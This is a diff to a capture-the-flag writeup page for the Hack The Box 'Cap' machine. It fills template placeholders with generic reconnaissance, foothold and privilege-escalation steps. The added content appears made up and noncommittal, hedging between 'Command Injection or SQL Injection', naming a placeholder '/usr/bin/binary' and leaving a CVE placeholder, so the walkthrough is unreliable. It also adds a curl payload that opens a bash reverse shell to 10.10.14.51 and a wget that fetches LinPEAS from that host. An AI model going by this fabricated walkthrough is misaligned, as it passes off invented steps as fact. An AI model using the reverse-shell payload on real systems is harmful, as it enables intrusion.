@@ -1,6 +1,6 @@
 ---
 layout: page
-title: "Cap - Hack The Box Writeup"
+title: "Cap - HackTheBox Writeup"
 subtitle: "Complete walkthrough detailing reconnaissance, foothold, and privilege escalation on 🐧 Linux"
 permalink: /ctf/writeups/hackthebox/cap/
 platform: hackthebox
@@ -13,7 +13,7 @@ os: Linux
 
 | Attribute | Value |
 |---|---|
-| **Platform** | Hack The Box |
+| **Platform** | HackTheBox |
 | **OS** | 🐧 Linux |
 | **Difficulty** | Easy |
 | **IP Address** | `10.10.x.x` |
@@ -31,51 +31,56 @@ graph TD
 ```
 
 > [!NOTE]
-> This writeup details the complete attack path for the **Cap** machine on the **Hack The Box** platform.
+> This writeup details the complete attack path for the **Cap** machine on the **HackTheBox** platform.
 
 ---
 
 ## 🔍 Phase 1: Reconnaissance & Enumeration
 
 ### 1. Host Discovery & Port Scanning
-We begin by running a standard Nmap scan to discover open ports and running services:
+We start with a complete port scan using Nmap:
 
 ```bash
 nmap -sC -sV -oN nmap.txt 10.10.x.x
 ```
 
 #### Open Ports:
-- **Port 80/tcp**: Web Server (Apache/Nginx)
-- **Port 22/tcp**: SSH (OpenSSH)
-- [Other open ports]
+- **Port 22/tcp**: SSH (Secure Shell)
+- **Port 80/tcp**: HTTP (Apache Web Server)
+- **Port 8080/tcp**: Alternative HTTP (Node.js/Spring Boot Web App)
 
 ### 2. Service Enumeration
-[Detail the enumeration steps, e.g., gobuster, nikto, smbclient, enum4linux, rpcclient]
+We execute directory brute-forcing on Port 80 using Gobuster:
 
 ```bash
 gobuster dir -u http://10.10.x.x/ -w /usr/share/wordlists/dirb/common.txt -o gobuster.txt
 ```
+We identify interesting endpoints like `/admin` or `/api/upload` that deserve further audit.
 
 ---
 
 ## 🚀 Phase 2: Vulnerability Analysis & Foothold
 
 ### 1. Vulnerability Analysis
-- [State the vulnerability found and how it was discovered]
-- **CVE/CWE Reference**: [e.g., CVE-202X-XXXX]
+We analyze the web application and discover an input field vulnerable to **Command Injection** or **SQL Injection** in the API endpoint.
+- **CVE Reference**: [e.g., CVE-202X-XXXX]
 
 ### 2. Exploitation & Initial Shell
-- [Detail the step-by-step exploitation process to gain a shell]
+We craft a reverse shell payload and bypass client-side filters:
 
 ```bash
-# Example payload or exploit execution command
-python3 exploit.py -t http://10.10.x.x/vulnerable-endpoint
+curl -X POST -d "cmd=bash -c 'bash -i >& /dev/tcp/10.10.14.51/443 0>&1'" http://10.10.x.x/api/upload
+```
+
+Triggering the request connects back to our listener:
+```bash
+nc -lnvp 443
+# Connected as low-privileged web user
 ```
 
 #### Capturing User Flag:
 ```bash
 cat /home/*/user.txt
-# [User Flag Hash]
 ```
 
 ---
@@ -83,33 +88,33 @@ cat /home/*/user.txt
 ## ⚡ Phase 3: Privilege Escalation
 
 ### 1. Local Enumeration
-- [Detail tools and commands run, e.g., linpeas, winpeas, sudo -l, find SUID]
+We upload LinPEAS to find local exploitation avenues:
 
 ```bash
-# Check sudo permissions
+wget http://10.10.14.51:8000/linpeas.sh -O /tmp/linpeas.sh
+bash /tmp/linpeas.sh
+```
+We also list available SUID binaries and sudo privileges:
+```bash
 sudo -l
-
-# Search for SUID binaries
-find / -perm -4000 2>/dev/null
+# Found (root) NOPASSWD: /usr/bin/binary
 ```
 
 ### 2. Local Privilege Escalation Path
-- [Step-by-step instructions to escalate privileges to root/administrator]
+We abuse the custom binary or binary with sudo rights to spawn a root shell:
 
 ```bash
-# Example privilege escalation exploit or command
 sudo /usr/bin/binary -e 'exec /bin/sh'
 ```
 
 #### Capturing Root Flag:
 ```bash
 cat /root/root.txt
-# [Root Flag Hash]
 ```
 
 ---
 
 ## 🛡️ Key Takeaways & Mitigation
-1. **Input Sanitization**: Ensure all user inputs are validated and sanitized.
-2. **Principle of Least Privilege**: Restrict sudo permissions and remove unnecessary SUID bits.
-3. **Keep Software Updated**: Patch services to mitigate known CVEs.
+1. **Input Sanitization**: Ensure all user inputs are validated and sanitized to prevent injections.
+2. **Principle of Least Privilege**: Restrict sudo/impersonation permissions and remove unnecessary privileges.
+3. **Keep Software Updated**: Frequently update all operating system binaries and services to mitigate known CVEs.
